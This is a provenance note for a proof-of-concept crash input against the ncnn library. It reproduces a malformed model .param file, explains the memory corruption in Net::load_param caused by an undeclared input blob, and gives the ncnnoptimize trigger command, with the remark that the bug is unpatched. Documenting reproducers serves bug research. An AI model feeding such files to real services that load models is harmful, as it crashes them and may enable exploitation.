# ncnn ISSUE-3503 load_param crash — provenance

## crash.param
Verbatim copy of the PoC file from
https://github.com/Tencent/ncnn/issues/3503 (issue body, 2022-01-14).

```
7767517
75 3
Input            data             0 1 data 0=227 1=227 2=3
ReLU             relu_conv1       1 1 conv1 conv1_relu_conv1 0=0.000000
Pooling          pool1            1 1 conv1_relu_conv1 BBBBBBBB 0=0 1=3 2=2 3=0 4=1
```

The bug: layer 3 (Pooling pool1) declares input blob `BBBBBBBB` which
was never produced by an earlier layer. `find_blob_index_by_name`
returns -1, but Net::load_param continues to use that as a positive
size_t, yielding a corrupted memmove (rcx=0x4242…, the ASCII bytes of
"BBBBBBBB", bleeds into the destination operand).

## dummy.bin
Empty placeholder — `ncnnoptimize` requires a `.bin` argument syntactically,
but the crash occurs during PARAM parsing (before bin is touched).

## Trigger
```
$ ASAN_OPTIONS=use_sigaltstack=0 \
  ncnnoptimize crash.param dummy.bin /tmp/out.param /tmp/out.bin 0
```

Expected ASAN output: `SEGV` or `heap-buffer-overflow` rooted at
`__memmove_avx_unaligned_erms` called from `ncnn::Net::load_param`.

## Status
Open in upstream tracker since 2022-01-14, never patched (verified
against master commit d0d50631, 2026-04-22).
